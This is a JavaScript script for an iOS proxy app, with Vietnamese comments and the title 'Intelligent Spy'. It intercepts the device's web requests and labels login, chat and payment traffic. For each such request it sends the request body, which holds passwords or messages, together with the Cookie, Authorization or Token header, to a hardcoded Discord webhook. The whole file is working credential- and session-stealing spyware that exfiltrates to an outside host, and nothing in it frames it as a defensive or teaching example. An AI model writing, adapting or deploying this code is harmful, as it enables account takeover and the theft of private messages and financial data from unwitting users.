/**
 * INTELLIGENT SPY - PHÂN LOẠI LOG
 * Tự động tách: Mật khẩu, Tin nhắn, Cookie, URL
 */

var url = $request.url;
var body = $request.body;
var headers = $request.headers;
var method = $request.method;

// 1. LỌC RÁC TRIỆT ĐỂ (Ảnh, Nhạc, Font, CSS, Video)
if (url.match(/\.(jpeg|jpg|png|gif|webp|svg|css|js|woff|woff2|ttf|mp3|wasm|mp4|ico)$/i)) {
    $done({});
}
// 2. CHỈ XỬ LÝ NẾU LÀ POST HOẶC CÓ COOKIE QUAN TRỌNG
else {
    analyzeAndSend();
    $done({});
}

function analyzeAndSend() {
    // --- PHÂN TÍCH LOẠI DỮ LIỆU ---
    var logType = "UNKNOWN";
    var embedColor = 9807270; // Màu xám (Mặc định)
    var title = "🌐 TRUY CẬP THÔNG THƯỜNG";

    // Kịch bản 1: Đăng nhập / Mật khẩu
    if (url.match(/(login|signin|auth|password|pwd|dangnhap|account)/i) && method === "POST") {
        logType = "LOGIN";
        title = "🚨 PHÁT HIỆN ĐĂNG NHẬP (HOT)";
        embedColor = 15548997; // Màu Đỏ
    }
    // Kịch bản 2: Tin nhắn / Chat
    else if (url.match(/(chat|msg|message|send|conversation|inbox)/i)) {
        logType = "CHAT";
        title = "💬 NỘI DUNG TIN NHẮN";
        embedColor = 3447003; // Màu Xanh Dương
    }
    // Kịch bản 3: Giao dịch / Nạp rút (Nếu có)
    else if (url.match(/(bank|deposit|withdraw|pay|money|coin)/i)) {
        logType = "MONEY";
        title = "💰 GIAO DỊCH TÀI CHÍNH";
        embedColor = 15105570; // Màu Vàng
    }

    // --- LẤY THÔNG TIN PHIÊN ĐĂNG NHẬP (SESSION) ---
    var sessionInfo = "Không có";
    if (headers['Cookie']) sessionInfo = headers['Cookie'];
    if (headers['Authorization']) sessionInfo = headers['Authorization'];
    if (headers['Token']) sessionInfo = headers['Token'];

    // --- GỬI VỀ DISCORD ---
    // Chỉ gửi nếu là POST hoặc là loại quan trọng (Login/Chat)
    // Để tránh spam các link GET vô nghĩa
    if (method === "POST" || logType !== "UNKNOWN") {
        sendToDiscord(title, embedColor, url, body, sessionInfo, method);
    }
}

function sendToDiscord(title, color, targetUrl, capturedBody, sessionData, methodType) {
    // ==================================================================
    // ⚠️ THAY WEBHOOK CỦA BẠN VÀO DÒNG DƯỚI ĐÂY ⚠️
    var discordUrl = "https://discordapp.com/api/webhooks/1454906156777472165/tLAGpqP0YKRK0HjgzhHat-CTb3s6OMiFrPqzse_KZ8NfD16FsgXiNmKbqxyqyaKPX1ST"; 
    // ==================================================================

    var data = {
        "username": "Spy Commander",
        "avatar_url": "https://cdn-icons-png.flaticon.com/512/3064/3064197.png",
        "embeds": [{
            "title": title,
            "color": color,
            "fields": [
                {
                    "name": "📍 Đang truy cập (URL)",
                    "value": "`" + methodType + "` " + targetUrl
                },
                {
                    "name": "📦 Nội dung Gửi đi (Password/Chat)",
                    "value": "```json\n" + (capturedBody ? capturedBody : "Không có dữ liệu Body") + "\n```"
                },
                {
                    "name": "🍪 Phiên Đăng Nhập (Cookie/Token)",
                    "value": "```" + (sessionData.length > 900 ? sessionData.substring(0, 900) + "..." : sessionData) + "```"
                }
            ],
            "footer": {
                "text": "Shadowrocket Intelligence | " + new Date().toLocaleTimeString()
            }
        }]
    };

    $task.fetch({
        url: discordUrl,
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(data)
    }, function(error, response, data) {});
}

